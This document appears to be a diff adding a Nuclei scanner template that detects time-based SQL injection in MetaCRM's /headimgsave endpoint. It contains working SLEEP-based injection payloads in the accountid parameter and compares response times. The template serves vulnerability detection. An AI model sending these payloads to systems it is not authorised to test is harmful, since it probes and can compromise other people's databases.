@@ -1,0 +1,42 @@
+id: metacrm-sqli-detection
+
+info:
+  name: MetaCRM SQL Injection Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects SQL Injection vulnerability in MetaCRM systems by analyzing the response delay caused by time-based payloads.
+  tags: sqli,metacrm,dast
+
+http:
+  - raw:
+      - |
+        GET /headimgsave?accountid=1'+AND+(SELECT+5+FROM+(SELECT+SLEEP(3))qaz)--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.1188.94 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - duration > 3000
+
+  - raw:
+      - |
+        GET /headimgsave?accountid=1'+AND+(SELECT+5+FROM+(SELECT+SLEEP(0))qaz)--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.1188.94 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - duration < 1000
+
+    stop-at-first-match: true
+
+variables:
+  slow_payload: "1'+AND+(SELECT+5+FROM+(SELECT+SLEEP(3))qaz)--+"
+  fast_payload: "1'+AND+(SELECT+5+FROM+(SELECT+SLEEP(0))qaz)--+"
